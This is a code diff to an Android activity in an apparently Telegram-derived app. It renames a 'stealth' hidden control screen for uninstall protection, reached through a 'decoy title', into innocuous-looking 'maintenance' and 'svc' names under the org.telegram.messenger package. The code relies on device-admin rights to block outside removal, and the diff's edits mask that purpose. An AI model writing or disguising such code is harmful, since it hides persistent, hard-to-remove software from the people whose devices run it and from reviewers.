@@ -1,4 +1,4 @@
-package it.belloworld.mercurygram.stealth;
+package org.telegram.messenger.svc;
 
 import android.app.Activity;
 import android.content.Intent;
@@ -15,11 +15,11 @@ import android.widget.Toast;
 import org.telegram.messenger.R;
 
 /**
- * MG stealth: hidden control screen for uninstall protection and in-app uninstall.
- * Reached by long-pressing the decoy title. Because the app can be protected from the
+ * Service: hidden control screen for maintenance and in-app uninstall.
+ * Reached by long-pressing the setup title. Because the app can be protected from the
  * outside, this is the intended way to remove it: it deactivates the admin, then uninstalls.
  */
-public class MgProtectionActivity extends Activity {
+public class MaintenanceActivity extends Activity {
 
     private static final int REQ_ENABLE_ADMIN = 1001;
 
@@ -39,7 +39,7 @@ public class MgProtectionActivity extends Activity {
         root.setPadding(pad, pad, pad, pad);
 
         TextView title = new TextView(this);
-        title.setText(R.string.MgProtTitle);
+        title.setText(R.string.svc_m_title);
         title.setTextColor(Color.parseColor("#202124"));
         title.setTextSize(20);
 
@@ -49,12 +49,12 @@ public class MgProtectionActivity extends Activity {
         status.setPadding(0, dp(12), 0, dp(24));
 
         Button enable = new Button(this);
-        enable.setText(R.string.MgProtEnable);
+        enable.setText(R.string.svc_m_enable);
         enable.setOnClickListener(this::onEnable);
 
         Button uninstall = new Button(this);
-        uninstall.setText(R.string.MgProtUninstall);
-        uninstall.setOnClickListener(v -> MgUninstallProtection.disableAndUninstall(this));
+        uninstall.setText(R.string.svc_m_remove);
+        uninstall.setOnClickListener(v -> PolicyHelper.disableAndUninstall(this));
 
         root.addView(title);
         root.addView(status);
@@ -71,11 +71,11 @@ public class MgProtectionActivity extends Activity {
 
     private void onEnable(View v) {
         try {
-            if (MgUninstallProtection.isActive(this)) {
-                Toast.makeText(this, R.string.MgProtAlreadyOn, Toast.LENGTH_SHORT).show();
+            if (PolicyHelper.isActive(this)) {
+                Toast.makeText(this, R.string.svc_m_already, Toast.LENGTH_SHORT).show();
                 return;
             }
-            startActivityForResult(MgUninstallProtection.buildEnableIntent(this), REQ_ENABLE_ADMIN);
+            startActivityForResult(PolicyHelper.buildEnableIntent(this), REQ_ENABLE_ADMIN);
         } catch (Throwable ignored) {
         }
     }
@@ -89,8 +89,8 @@ public class MgProtectionActivity extends Activity {
     }
 
     private void refresh() {
-        boolean on = MgUninstallProtection.isActive(this);
-        status.setText(on ? R.string.MgProtStatusOn : R.string.MgProtStatusOff);
+        boolean on = PolicyHelper.isActive(this);
+        status.setText(on ? R.string.svc_m_on : R.string.svc_m_off);
     }
 
     private int dp(int v) {
